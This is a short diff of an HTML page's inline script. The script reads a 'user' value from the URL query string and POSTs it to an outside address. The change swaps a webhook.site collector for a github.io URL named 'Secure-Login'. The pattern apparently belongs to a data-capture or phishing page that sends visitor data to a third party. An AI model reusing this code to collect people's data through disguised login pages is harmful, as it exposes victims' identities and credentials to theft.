@@ -36,12 +36,12 @@
   </style>
 
   <script>
-    // Capture query string (e.g., ?user=JohnDoe)
+    // Capture query string
     const params = new URLSearchParams(window.location.search);
     const user = params.get("user");
 
     // Send data to Webhook.site
-    fetch("https://webhook.site/a4c917e5-e74b-4fe7-9382-06bb5b2a5b0f", {
+    fetch("https://mphopops.github.io/Secure-Login/", {
       method: "POST",
       headers: {
         "Content-Type": "application/json"
